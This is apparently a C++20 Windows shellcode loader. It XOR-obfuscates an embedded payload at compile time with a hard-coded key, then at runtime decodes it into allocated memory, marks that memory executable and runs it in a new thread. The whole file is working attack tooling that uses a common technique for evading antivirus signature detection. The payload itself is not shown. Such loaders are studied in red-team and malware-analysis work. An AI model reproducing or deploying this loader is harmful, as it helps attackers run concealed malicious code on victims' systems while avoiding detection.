#include <windows.h>                // Winapi -------
#include "generated/payload.hpp"    // Raw payload --

// -- C++20 module imports -------------------------------------------------------------------------
import lbyte.stx;
import std      ;

// -- Namespace aliases ----------------------------------------------------------------------------
using namespace std       ;
using namespace lbyte::stx;

namespace vw = ranges::views;

// -- Symmetric XOR transformation -----------------------------------------------------------------
constexpr auto crypt(auto arr, auto key) {
    const auto keystream = vw::repeat(key) | vw::join;

    for ( auto &&[byte, mask] : vw::zip(arr, keystream) )
        byte ^= mask;

    return arr;
}

// -- Compile-time key and payload transformation --------------------------------------------------
constexpr auto key       = to_array(u8"patatas");
constexpr auto shellcode = crypt(payload::data(), key);

auto main() -> i32
{
    // -- Resource cleanup callbacks ---------------------------------------------------------------
    const auto sys_free = []( u8* ptr ) noexcept {
        if ( ptr )
            VirtualFree( ptr, 0, MEM_RELEASE );
    };

    const auto handle_close = []( u8* handle ) noexcept {
        if ( handle and handle != INVALID_HANDLE_VALUE )
            CloseHandle( handle );
    };

    // -- Allocate writable memory for the payload -------------------------------------------------
    auto exec_mem = unique_ptr<u8, decltype(sys_free)>{
        rcast<u8*>(VirtualAlloc(
            null,
            shellcode.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )),
        sys_free
    };

    if ( not exec_mem ) {
        println(stderr, "[-] VirtualAlloc failed: {}", GetLastError());
        return EXIT_FAILURE;
    }

    // -- Copy the encoded payload into executable memory ------------------------------------------
    mem::write(exec_mem.get(), shellcode);
    crypt(span{exec_mem.get(), shellcode.size()}, key);

    println("[+] Payload copied successfully on: {}", ptr{exec_mem.get()});

    // -- Enable executable permissions ------------------------------------------------------------
    auto old_protect = ulong{};
    auto success     = VirtualProtect(
        exec_mem.get(),
        shellcode.size(),
        PAGE_EXECUTE_READ,
        &old_protect
    );

    if ( not success ) {
        println(stderr, "[-] VirtualProtect failed: {}", GetLastError());
        return EXIT_FAILURE;
    }

    println("[+] Creating thread...");

    // -- Launch the payload in a dedicated thread -------------------------------------------------
    auto thread_id = u32{};
    auto h_thread  = unique_ptr<u8, decltype(handle_close)>{
        rcast<u8*>(CreateThread(
            null,
            0x00,
            rcast<LPTHREAD_START_ROUTINE>( exec_mem.get()),
            null,
            0x00,
            rcast<LPDWORD>( &thread_id )
        )),
        handle_close
    };

    if ( not h_thread ) {
        println(stderr, "[-] CreateThread failed: {}", GetLastError());
        return EXIT_FAILURE;
    }

    // -- Wait for execution to complete -----------------------------------------------------------
    println("[+] Thread {} initialized. Waiting for execution...", thread_id);
    WaitForSingleObject( h_thread.get(), INFINITE );

    println("[+] Execution finished.");
}

